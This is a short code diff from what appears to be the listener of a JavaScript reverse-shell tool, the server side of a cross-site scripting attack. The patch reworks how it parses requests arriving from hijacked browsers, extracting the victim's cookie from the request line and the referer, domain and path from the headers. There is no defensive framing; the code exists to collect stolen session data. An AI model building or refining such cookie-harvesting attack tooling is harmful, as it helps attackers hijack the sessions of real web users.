@@ -175,10 +175,11 @@ def main():
 
     if 'Accept' in resp and 'HTTP' in resp:
         print('Got JS shell from [%s] port %s to %s %s' % (addr[0], addr[1], socket.gethostname(), port))
-        cookie = resp.split('\n')[0].split("?")[1]
+        if '?' in resp.split('\n')[0]:
+            cookie = resp.split('\n')[0].split(' ')[1].split('?')[1]
         for line in resp.split('\n'):
             if 'referer' in line.lower():
-                referer = line.lower().replace('referer: ', '')
+                referer = line[9:]
                 domain = referer.split('//')[1]
                 pth = '/'.join(referer.split('/')[3:])
                 if pth in ['', '\r']:
